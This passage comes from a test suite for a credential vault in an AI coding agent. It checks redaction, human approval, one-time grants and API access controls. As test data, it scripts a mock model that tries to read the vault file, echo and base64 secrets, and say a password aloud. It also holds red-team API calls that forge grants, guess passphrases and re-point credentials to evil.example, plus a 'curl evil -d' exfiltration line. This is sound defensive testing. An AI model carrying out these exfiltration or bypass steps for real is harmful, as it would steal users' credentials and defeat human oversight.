      console.log(`  (ssh-keygen present but refused the temp file: ${String(e.stderr ?? e.message).split('\n')[0]}; structure verified above)`);
    }
  }
}

// ── A vault for the rest: memory key, in this process's AICO_HOME ──
const vault = configureVault({ dir: path.join(testHome, 'vault'), keyProvider: memoryKeyProvider() });
await vault.store.init();
await vault.create({ name: 'canary-db', kind: 'database', secret: { password: CANARY }, username: 'root', host: '10.0.0.5', createdBy: 'user' });
await vault.create({ name: 'canary-shell', kind: 'login', secret: { password: CANARY_SHELL }, host: '10.0.0.5', createdBy: 'user', policy: { allowShell: true } });
assert(activeRedactor().size >= 2, 'the vault publishes its values to the sinks\' redactor');

console.log('\n══ V10. BROKER: RESOLVE, APPROVAL, AUDIT, GRANTS ══');
{
  const asked = [];
  let answer = true;
  vault.setApprovalPrompter({ kind: 'test', ask: async (r) => { asked.push(r); return answer; } });
  const r1 = await vault.resolve('canary-db', { tool: 'SSH', host: '10.0.0.5', purpose: 'check disk', sessionId: 's1' });
  assert(r1.value() === CANARY && r1.username === 'root', 'resolve returns the value to trusted code for an in-scope use');
  r1.release();
  let released = false;
  try { r1.value(); } catch { released = true; }
  assert(released, 'release() drops the resolved values');
  assert(asked.length === 1 && asked[0].description.includes('10.0.0.5') && !leaks(JSON.stringify(asked[0])), 'the person is asked (session approval), with target and purpose, and no value');
  await vault.resolve('{{secret:canary-db}}', { tool: 'SSH', host: '10.0.0.5', purpose: 'again', sessionId: 's1' });
  assert(asked.length === 1, 'the session approval is remembered for that session and tool');
  assert(await throwsCode(() => vault.resolve('canary-db', { tool: 'SSH', host: '10.9.9.9', purpose: 'exfil', sessionId: 's1' }), 'policy-denied'), 'an out-of-scope host is refused');
  answer = false;
  assert(await throwsCode(() => vault.resolve('canary-db', { tool: 'SSH', host: '10.0.0.5', purpose: 'x', sessionId: 's2' }), 'approval-denied'), 'a person saying no is final');
  let nf;
  try { await vault.resolve('canary-dbb', { tool: 'SSH', purpose: 'x' }); } catch (e) { nf = e; }
  assert(nf?.code === 'not-found' && nf.message.includes('canary-db') && !leaks(nf.message), 'an unknown name suggests similar NAMES only');
  answer = true;

  const trail = vault.auditTrail({ limit: 50 });
  assert(trail.some(e => e.action === 'use' && e.outcome === 'ok') && trail.some(e => e.outcome === 'denied') && trail.some(e => e.outcome === 'declined'), 'the audit log records allowed, denied and declined uses');
  assert(!leaks(fs.readFileSync(vault.audit.path, 'utf8')), 'the audit log holds no value');

  // Grants
  const g = new HumanGrants();
  const n = g.register({ action: 'reveal', credentialId: 'c1' });
  assert(!g.consume(n, 'loosen', 'c1') && !g.consume(n, 'reveal', 'c1'), 'a grant is for one action and is spent even when misused');
  const n2 = g.register({ action: 'reveal', credentialId: 'c1', ttlMs: 1 });
  assert(!g.consume(n2, 'reveal', 'c1', Date.now() + 10), 'an expired grant is refused');
  const n3 = g.register({ action: 'reveal', credentialId: 'c1' });
  assert(!g.consume(n3, 'reveal', 'c2') , 'a grant for one credential does not reveal another');
  const id = (await vault.get('canary-db')).id;
  assert(await throwsCode(() => vault.reveal('canary-db', 'made-up-nonce-1234567890'), 'grant-required'), 'reveal without a real grant is refused');
  const nonce = vault.grants.register({ action: 'reveal', credentialId: id });
  const shown = await vault.reveal('canary-db', nonce);
  assert(shown.fields.password === CANARY, 'reveal with a host-minted grant returns the value to the person');
  assert(await throwsCode(() => vault.reveal('canary-db', nonce), 'grant-required'), 'the grant is one-time');
  assert(await throwsCode(() => vault.setPolicy('canary-db', { approval: 'auto' }), 'grant-required'), 'loosening a policy needs a grant');
  const tightened = await vault.setPolicy('canary-db', { approval: 'every-use' });
  assert(tightened.policy.approval === 'every-use', 'tightening needs none');
  await vault.setPolicy('canary-db', { approval: 'session' }, vault.grants.register({ action: 'loosen', credentialId: id }));
  assert(await throwsCode(() => vault.updateMeta('canary-db', { host: '203.0.113.9' }), 'grant-required'), 're-pointing a credential at another host needs a grant');
  assert(await throwsCode(() => vault.rotate('canary-db', { password: 'attacker-chosen-1' }), 'grant-required'), 'replacing a user\'s credential needs a grant');
  assert(await throwsCode(() => vault.remove('canary-db'), 'grant-required'), 'deleting a user\'s credential needs a grant');
}

console.log('\n══ V11. MODEL TOOLS RETURN NO SECRET (raw, before any redaction) ══');
{
  const saved = activeRedactor();
  setActiveRedactor(Redactor.EMPTY); // prove the tools themselves never return a value
  try {
    const listed = await credentialList({});
    assert(listed.credentials.length >= 2 && !leaks(listed), 'CredentialList: metadata only');
    assert(!leaks(await credentialList({ host: '10.0.0.5', kind: 'database' })), 'CredentialList filtered: metadata only');
    const gen = await credentialGenerate({ name: 'svc-admin', kind: 'login', username: 'admin', url: 'https://10.0.0.5:8443' });
    assert(gen.reference === '{{secret:svc-admin}}' && gen.username === 'admin' && !('password' in gen), 'CredentialGenerate: reference and username, no password');
    const genValue = (await vault.revealForOwner('svc-admin', 'reveal', 'test')).secret.password;
    assert(!JSON.stringify(gen).includes(genValue) && !leaks(JSON.stringify(gen), [genValue]), 'CredentialGenerate: the generated value appears nowhere in its result');
    const key = await credentialGenerate({ name: 'svc-key', kind: 'ssh-key', username: 'deploy', host: '10.0.0.5' });
    const priv = (await vault.revealForOwner('svc-key', 'reveal', 'test')).secret.privateKey;
    assert(key.publicKey?.startsWith('ssh-ed25519 ') && !JSON.stringify(key).includes(priv.split('\n')[1]), 'CredentialGenerate ssh-key: public key back, private key stays in the vault');
    const req = await credentialRequest({ name: 'nas-admin', kind: 'login', host: '10.0.0.9', reason: 'log into the NAS' });
    assert(/unavailable|timed out|declined/.test(req.result ?? '') && !leaks(req), 'CredentialRequest with nobody attached: a status, no value');
  } finally {
    setActiveRedactor(saved);
  }
  // Fulfil path: a person answers; the tool still gets only a status.
  vault.setNotifier(() => {});
  const pending = credentialRequest({ name: 'nas-admin', kind: 'login', host: '10.0.0.9', reason: 'log into the NAS' });
  await new Promise(r => setTimeout(r, 50));
  const reqId = vault.requests.list()[0]?.requestId;
  assert(!!reqId && vault.fulfil(reqId, { value: 'Nas-Can4ry-Pw-123456' }), 'the fulfil route stores a value for a pending request');
  const res = await pending;
  assert(res.result === 'stored as nas-admin' && !JSON.stringify(res).includes('Nas-Can4ry'), 'CredentialRequest: "stored as nas-admin", nothing more');
  vault.setNotifier(undefined);

  // Registry invariant: only the credential tool module may import the vault, and
  // nothing outside the vault calls the value accessors.
  const toolFiles = fs.readdirSync('src/tools').filter(f => f.endsWith('.ts'));
  const importing = toolFiles.filter(f => /from '\.\.\/vault\/(?!sink\.js)/.test(fs.readFileSync(path.join('src/tools', f), 'utf8')));
  assert(importing.every(f => f === 'credentials.ts'), `only tools/credentials.ts reaches into the vault (found: ${importing.join(', ') || 'none'})`);
  const walk = (d) => fs.readdirSync(d, { withFileTypes: true }).flatMap(e => e.isDirectory() ? walk(path.join(d, e.name)) : [path.join(d, e.name)]);
  const offenders = walk('src').filter(f => f.endsWith('.ts') && !f.split(path.sep).includes('vault'))
    .filter(f => /\.(secretOf|revealForOwner|secretEntries)\(/.test(fs.readFileSync(f, 'utf8')));
  assert(offenders.length === 0, `no code outside src/vault calls a value accessor (${offenders.join(', ') || 'none'})`);
  const names = toolDefinitions.map(t => t.name);
  assert(['CredentialList', 'CredentialRequest', 'CredentialGenerate'].every(n => names.includes(n) && VAULT_TOOL_CLASSES[n] === 'metadata'), 'the three credential tools are registered and classified');
}

console.log('\n══ V12. EVERY REGISTERED TOOL, THROUGH THE PIPELINE AND THE LOOP ══');
{
  const payload = (name) => ({
    stdout: `${name}: ${CANARY} | ${Buffer.from(CANARY).toString('base64')} | ${Buffer.from(`root:${CANARY}`).toString('base64')}`,
    nested: { hex: Buffer.from(CANARY).toString('hex'), url: encodeURIComponent(CANARY) },
    error: `failed near ${CANARY}`,
  });
  // 1. The pipeline choke point, per tool name.
  const pipeline = new ToolPipeline();
  const hookSaw = [];
  pipeline.onPostExecute('observer', async (ctx, next) => { const d = await next(); hookSaw.push(d.outcome.result); return d; });
  let pipelineClean = true;
  for (const def of toolDefinitions) {
    const out = await pipeline.execute({ callId: `c-${def.name}`, name: def.name, arguments: {}, agentId: 'a', state: new Map() }, async () => payload(def.name));
    if (leaks(out.outcome.result)) { pipelineClean = false; console.log(`    leak via ${def.name}`); }
  }
  assert(pipelineClean, `no tool's result leaves the pipeline with a value (${toolDefinitions.length} tools)`);
  assert(!leaks(hookSaw), 'post-execute observers (where PostToolUse runs) only ever see redacted results');
  const thrown = await pipeline.execute({ callId: 't', name: 'X', arguments: {}, agentId: 'a', state: new Map() }, async () => { throw new Error(`boom ${CANARY}`); });
  assert(!leaks(thrown.outcome.result), 'a tool that throws with a value in its message is redacted too');

  // 2. The real loop, with every built-in name registered as a fake that leaks.
  const ctx = createRootContext({ tools: { noBuiltins: true } });
  for (const def of toolDefinitions) ctx.require('tools').register({ ...def, isConcurrencySafe: true }, async () => payload(def.name));
  const session = new Session({ id: 'vault-all-tools', cwd: process.cwd(), startedAt: Date.now() });
  const seenByModel = [];
  const provider = {
    id: 'mock', displayName: 'Mock',
    async *chat(opts) {
      seenByModel.push(JSON.stringify(opts.messages));
      if (seenByModel.length === 1) {
        for (const def of toolDefinitions) yield { type: 'tool_call', id: `x-${def.name}`, name: def.name, input: {} };
        yield { type: 'finish', reason: 'tool_calls' };
      } else {
        yield { type: 'text', content: 'done' };
        yield { type: 'finish', reason: 'stop' };
      }
    },
  };
  const done = [];
  await runAgent({
    task: 'call everything', model: 'mock-model', showPlan: false, autoApprove: true, verbose: false, silent: true,
    conversationHistory: [], sessionId: session.header.id, session, provider, context: ctx,
    settings: { completionGate: { enabled: false }, cron: { enabled: false }, repeatGuard: { enabled: false } },
    onToolDone: (n, r) => done.push(r),
  });
  const results = session.events.filter(e => e.type === 'tool/result');
  assert(results.length === toolDefinitions.length, `the loop ran all ${toolDefinitions.length} registered tool names`);
  assert(!leaks(JSON.stringify(session.events)), 'none of their results reached the session log with a value');
  assert(!leaks(seenByModel.join('\n')), 'none reached the model');
  assert(done.length > 0 && !leaks(done), 'none reached onToolDone (the stream)');
  await ctx.dispose();
}

console.log('\n══ V13. CANARY THROUGH EVERY SINK (a real turn, persisted) ══');
{
  const project = fs.mkdtempSync(path.join(tmp, 'proj-'));
  const spillDir = path.join(tmp, 'spill');
  setSpillDir(spillDir);
  // A config file the agent "wrote earlier" holding the value in several encodings, big enough to spill.
  const leakyFile = path.join(project, 'deploy.conf');
  fs.writeFileSync(leakyFile, [
    `DB_PASSWORD=${CANARY}`,
    `DB_PASSWORD_B64=${Buffer.from(CANARY).toString('base64')}`,
    `AUTH_HEADER=Basic ${Buffer.from(`root:${CANARY}`).toString('base64')}`,
    `DB_URL=postgres://root:${encodeURIComponent(CANARY)}@10.0.0.5/app`,
    `HEX=${Buffer.from(CANARY).toString('hex')}`,
    'filler '.repeat(9000),
    `TAIL_PASSWORD=${CANARY}`,
  ].join('\n'));

  const hookOut = path.join(tmp, 'hook-input.txt');
  process.env.AICO_VAULT_HOOK_OUT = hookOut;
  const hookCmd = 'node -e "require(\'fs\').appendFileSync(process.env.AICO_VAULT_HOOK_OUT, (process.env.AICO_HOOK_CONTEXT||\'\')+String.fromCharCode(10))"';
  freezeHooks({ hooks: { PostToolUse: [hookCmd], UserPromptSubmit: [hookCmd], PreToolUse: [hookCmd] } });

  const session = new Session({ id: `vault-canary-${Date.now()}`, cwd: project, startedAt: Date.now() });
  await initEventLog(session.header);
  const handle = persistSession(session);
  const gh = 'ghp_' + 'Zz9Yy8Xx7Ww6Vv5Uu4Tt3Ss2Rr1Qq0Pp9Oo8';
  const asked = [];
  vault.setApprovalPrompter({ kind: 'test', ask: async (r) => { asked.push(r); return true; } });

  const seenByModel = [];
  let step = 0;
  const provider = {
    id: 'mock', displayName: 'Mock',
    async *chat(opts) {
      seenByModel.push(JSON.stringify(opts.messages) + (opts.volatileContext ?? '') + (opts.systemPrompt ?? ''));
      step++;
      if (step === 1) {
        // A model that learned nothing still tries: cat the file, echo a shell secret, base64 it.
        yield { type: 'tool_call', id: 'b1', name: 'Bash', input: { command: `cat "${leakyFile.replace(/\\/g, '/')}"` } };
        yield { type: 'tool_call', id: 'b2', name: 'Bash', input: { command: 'node -e "console.log(process.argv[1]); console.log(Buffer.from(process.argv[1]).toString(\'base64\'))" {{secret:canary-shell}}' } };
        yield { type: 'tool_call', id: 'b3', name: 'Bash', input: { command: 'node -e "console.log(require(\'crypto\').createHash(\'sha256\').update(process.argv[1]).digest(\'hex\'))" {{secret:canary-shell}}' } };
        yield { type: 'tool_call', id: 'b4', name: 'Bash', input: { command: 'echo {{secret:canary-db}}' } };
        yield { type: 'tool_call', id: 'r1', name: 'Read', input: { file_path: path.join(testHome, 'vault', 'vault.json') } };
        yield { type: 'finish', reason: 'tool_calls' };
      } else {
        // And tries to say it out loud, as if it had it.
        yield { type: 'text', content: `The password is ${CANARY} (base64 ${Buffer.from(CANARY).toString('base64')}).` };
        yield { type: 'finish', reason: 'stop' };
      }
    },
  };
  const stream = [];
  const result = await runAgent({
    task: `deploy it with {{secret:canary-shell}}. my github token is ${gh} and the db password=${CANARY}`,
    model: 'mock-model', cwd: project, showPlan: false, autoApprove: true, verbose: false, silent: true,
    conversationHistory: [], sessionId: session.header.id, session, provider,
    settings: { completionGate: { enabled: false }, cron: { enabled: false }, repeatGuard: { enabled: false }, hooks: {} },
    onToolCall: (n, a, id) => stream.push({ n, a, id }),
    onToolDone: (n, r, id) => stream.push({ n, r, id }),
    onChunk: (t) => stream.push({ chunk: t }),
    onReasoning: (t) => stream.push({ reasoning: t }),
  });
  stream.push({ result });
  await handle.detach();
  resetHooks();
  setSpillDir(undefined);

  const results = Object.fromEntries(session.events.filter(e => e.type === 'tool/result').map(e => [e.data.callId, e.data.content]));

  assert(results.b1 && results.b1.includes('[secret:canary-db]'), 'Bash output of a file holding the value arrives redacted');
  assert(/[0-9a-f]{64}/.test(results.b3 ?? '') && (results.b3 ?? '').includes(crypto.createHash('sha256').update(CANARY_SHELL).digest('hex')),
    'a {{secret:…}} in Bash reached the child process (its hash is right) without the value entering the command');
  assert(asked.some(a => a.tool === 'Bash' && a.purpose.includes('{{secret:canary-shell}}') && !leaks(a.purpose)), 'the person was shown the exact command, with the reference, not the value');
  assert(/not allowed in shell/.test(results.b4 ?? ''), 'a credential without allowShell is refused in Bash');
  assert(/vault/.test(results.r1 ?? '') && !(results.r1 ?? '').includes('"records"'), 'Read of the vault file is denied by the guard');
  const tcall = session.events.find(e => e.type === 'tool/call' && e.data.callId === 'b2');
  assert(tcall && JSON.stringify(tcall.data).includes('{{secret:canary-shell}}'), 'the logged tool call keeps the reference as the model wrote it');

  const logFile = eventLogPath(session.header.id, project);
  const logText = fs.readFileSync(logFile, 'utf8');
  const spills = fs.existsSync(spillDir) ? fs.readdirSync(spillDir).map(f => fs.readFileSync(path.join(spillDir, f), 'utf8')) : [];
  const hookText = fs.existsSync(hookOut) ? fs.readFileSync(hookOut, 'utf8') : '';
  const exported = toMarkdown(session);
  const audit = fs.readFileSync(vault.audit.path, 'utf8');
  const quarantined = await vault.list({ tag: 'quarantined' });
  const allCanaries = [...ALL_CANARIES, gh];

  assert(spills.length > 0, `the big output spilled to disk (${spills.length} file(s))`);
  assert(hookText.includes('PostToolUse') && hookText.includes('UserPromptSubmit'), 'hooks ran and captured their input');
  assert(quarantined.some(c => c.name.startsWith('pasted-github-token')), 'a token typed into the message was vaulted as a quarantined entry');
  assert(!quarantined.some(c => c.name.startsWith('pasted-secret')), 'a {{secret:…}} reference in the message is not mistaken for a secret');
  const firstUser = session.events.find(e => e.type === 'user/message')?.data.content ?? '';
  assert(firstUser.includes('[secret:pasted-github-token') && firstUser.includes('password=[secret:canary-db]'),
    'the message the model got names both: a new quarantined entry, and the existing credential the typed password already matched');

  const sinks = {
    'result returned to the caller': result,
    'what the model was sent (every request)': seenByModel.join('\n'),
    'session log file on disk': logText,
    'exported transcript': exported,
    'spill files': spills.join('\n'),
    'hook input (Pre/PostToolUse, UserPromptSubmit)': hookText,
    'stream events (tool start/done, chunks)': JSON.stringify(stream),
    'audit log': audit,
  };
  for (const [sink, text] of Object.entries(sinks)) {
    const hit = leaks(text, allCanaries);
    assert(!hit, `no canary, in any encoding, in: ${sink}${hit ? ` (found ${hit})` : ''}`);
  }
  vault.setApprovalPrompter(undefined);
}

console.log('\n══ V14. SSE HUB AND HOST CHANNEL ══');
{
  const hub = new EventHub();
  const writes = [];
  hub.subscribe('s', { writeHead() {}, write(x) { writes.push(x); } });
  hub.publish({ type: 'tool-done', sessionId: 's', data: { result: { stdout: CANARY } } });
  hub.publish({ type: 'chunk', sessionId: 's', data: { text: `x ${Buffer.from(CANARY).toString('base64')}` } });
  assert(!leaks(writes.join('')), 'every SSE frame passes the redactor');

  // Host channel: grants and approvals arrive over the private port only.
  const listeners = [];
  const posted = [];
  attachVaultHostChannel({ postMessage: (m) => posted.push(m), on: (_e, l) => listeners.push(l) });
  const send = async (data) => { for (const l of listeners) l({ data }); await new Promise(r => setTimeout(r, 20)); };
  const id = (await vault.get('canary-db')).id;
  await send({ type: 'vault/grant', nonce: 'host-minted-nonce-000000001', action: 'reveal', credentialId: id });
  const shown = await vault.reveal('canary-db', 'host-minted-nonce-000000001', 'desktop');
  assert(shown.fields.password === CANARY, 'a grant minted by the host over its port authorises one reveal');
  vault.setApprovalPrompter(vault.serverPrompter());
  const pending = vault.resolve('canary-shell', { tool: 'Bash', purpose: 'run: echo', sessionId: 'h1' }).then(() => 'ok', (e) => e.code);
  await new Promise(r => setTimeout(r, 30));
  const reqMsg = posted.find(m => m.type === 'vault/approve-request');
  assert(reqMsg && !leaks(JSON.stringify(reqMsg)), 'an approval request goes to the host, carrying no value');
  await send({ type: 'vault/approval', id: reqMsg.request.id, approved: true });
  assert(await pending === 'ok', 'the host\'s answer over the port approves the use');

  // Browser vault login: main asks for the page's origin, gets the fields over the port.
  await send({ type: 'vault/fill-request', requestId: 'f1', origin: 'https://10.0.0.5:8443' });
  await new Promise(r => setTimeout(r, 30));
  const fill = posted.find(m => m.type === 'vault/fill' && m.requestId === 'f1');
  const expected = (await vault.revealForOwner('svc-admin', 'reveal', 'test')).secret.password;
  assert(fill?.ok && fill.name === 'svc-admin' && fill.username === 'admin' && fill.fields.password === expected,
    'fill-request: the credential bound to the origin reaches the host process for autofill');
  await send({ type: 'vault/fill-request', requestId: 'f2', origin: 'https://10.0.0.5.evil.example' });
  await send({ type: 'vault/fill-request', requestId: 'f3', origin: 'http://10.0.0.5:8443' });
  await new Promise(r => setTimeout(r, 30));
  assert(posted.filter(m => m.type === 'vault/fill' && (m.requestId === 'f2' || m.requestId === 'f3')).every(m => m.ok === false && !m.fields),
    'fill-request: a look-alike host or a downgraded scheme gets nothing');
  vault.setHostSender(undefined);
  vault.setApprovalPrompter(undefined);
}

console.log('\n══ V15. RED TEAM: THE HTTP API WITH THE TOKEN ══');
{
  const project = fs.mkdtempSync(path.join(tmp, 'srv-'));
  const server = await serve({ port: 0, cwd: project, open: false });
  const u = new URL(server.url);
  const token = u.searchParams.get('token');
  const base = `${u.origin}/api/`;
  const bodies = [];
  const call = async (route, body) => {
    const res = await fetch(base + route, body === undefined
      ? { headers: { 'x-aico-token': token } }
      : { method: 'POST', headers: { 'x-aico-token': token, 'content-type': 'application/json' }, body: JSON.stringify(body) });
    const text = await res.text();
    bodies.push(text);
    return { status: res.status, text, json: (() => { try { return JSON.parse(text); } catch { return {}; } })() };
  };
  try {
    const id = (await vault.get('canary-db')).id;
    const idShell = (await vault.get('canary-shell')).id;
    assert((await call('vault/status')).status === 200, 'status is readable');
    assert((await call('vault/list')).json.credentials?.length >= 2, 'list is readable (metadata)');
    await call(`vault/get?id=${id}`);
    await call('vault/audit?limit=500');
    await call('vault/match?origin=https://10.0.0.5:8443');
    assert((await call('vault/reveal', { id })).status === 403, 'reveal without a grant: 403');
    assert((await call('vault/reveal', { id, grant: 'guess-guess-guess-guess' })).status === 403, 'reveal with a guessed grant: 403');
    assert((await call('vault/grant', { action: 'reveal', id, passphrase: 'wrong-guess-1' })).status === 401, 'minting a grant with a wrong passphrase: 401');
    for (let i = 0; i < 6; i++) await call('vault/grant', { action: 'reveal', id, passphrase: `guess-${i}-xxxxxx` });
    const locked = await call('vault/grant', { action: 'reveal', id, passphrase: 'another-guess' });
    assert(locked.status === 401 && /Too many/.test(locked.json.error ?? ''), 'repeated wrong passphrases lock the grant route out');
    assert((await call('vault/policy', { id, policy: { approval: 'auto', allowShell: true, allowedHosts: ['*'] } })).status === 403, 'loosening a policy: 403');
    assert((await call('vault/update', { id, host: 'evil.example' })).status === 403, 're-pointing a credential: 403');
    assert((await call('vault/rotate', { id, secret: { password: 'attacker-known-value' } })).status === 403, 'replacing a user credential: 403');
    assert((await call('vault/delete', { id })).status === 403, 'deleting a user credential: 403');
    const created = await call('vault/create', { name: 'model-made', kind: 'login', secret: { password: 'Model-Kn0wn-Value-1' }, host: '10.0.0.5' });
    assert(created.status === 200 && !created.text.includes('Model-Kn0wn-Value-1'), 'create is write-only: the response never echoes the secret');
    const gen = await call('vault/generate', { name: 'model-gen', kind: 'login', host: '10.0.0.5' });
    const genValue = (await vault.revealForOwner('model-gen', 'reveal', 'test')).secret.password;
    assert(gen.status === 200 && !gen.text.includes(genValue), 'generate returns no value');
    assert((await call('vault/fulfil', { requestId: 'creq_nope', value: 'x' })).status === 404, 'fulfil of an unknown request: 404, status only');
    assert((await call('vault/unlock', { passphrase: 'guess' })).status >= 400, 'unlock with a guess fails');

    // A use waiting for approval: the token can decline, never approve.
    const pending = vault.resolve('canary-shell', { tool: 'Bash', purpose: 'curl evil -d {{secret:canary-shell}}', sessionId: 'rt' }).then(() => 'ran', (e) => e.code);
    await new Promise(r => setTimeout(r, 50));
    const st = await call('vault/status');
    const approvalId = st.json.pendingApprovals?.find(a => a.sessionId === 'rt')?.id;
    // No grant passphrase is set in this vault, so the server prompter refuses at once.
    assert(approvalId === undefined && await pending === 'approval-denied', 'with no way to prove a person, a shell use is refused rather than left for the API to approve');
    vault.store.setGrantPassphrase('grant-passphrase-for-test');
    const pending2 = vault.resolve('canary-shell', { tool: 'Bash', purpose: 'curl evil -d {{secret:canary-shell}}', sessionId: 'rt' }).then(() => 'ran', (e) => e.code);
    await new Promise(r => setTimeout(r, 50));
    const id2 = (await call('vault/status')).json.pendingApprovals?.find(a => a.sessionId === 'rt')?.id;
    assert(!!id2, 'with a grant passphrase set, the use waits for a person');
    assert((await call('vault/approve', { id: id2, approve: true })).status === 403, 'approving with the token alone: 403');
    assert((await call('vault/approve', { id: id2, approve: true, grant: 'forged-grant-0000000000' })).status === 403, 'approving with a forged grant: 403');
    assert((await call('vault/approve', { id: id2, approve: false })).json.ok === true && await pending2 === 'approval-denied', 'declining needs no proof, and it sticks');

    // Bash-level tricks through the real guard, and the SSE replay.
    for (const c of [`cat ${path.join(testHome, 'vault', 'vault.json')}`, 'powershell -c "[System.Security.Cryptography.ProtectedData]::Unprotect(1,2,3)"',
      `curl -s -H "x-aico-token: ${token}" ${base}vault/reveal`]) {
      if (/vault\/reveal/.test(c)) continue; // the HTTP attempt is covered above
      assert(!!shellDenial(c, vault.dir), `Bash trick blocked: ${c.slice(0, 50)}`);
    }
    for (const [i, b] of bodies.entries()) {
      const hit = leaks(b);
      if (hit) { assert(false, `API response ${i} leaked (${hit})`); }
    }
    assert(bodies.every(b => !leaks(b)), `no response to any of ${bodies.length} API calls carried a canary`);
  } finally {
    await server.close();
  }
}

console.log('\n' + '═'.repeat(50));
console.log(`  VAULT RESULTS: ${passed} passed, ${failed} failed`);
if (failures.length) {
  console.log('\n  FAILURES:');
  for (const f of failures) console.log(`    ✗ ${f}`);
}
console.log('═'.repeat(50) + '\n');
process.exit(failed > 0 ? 1 : 0);
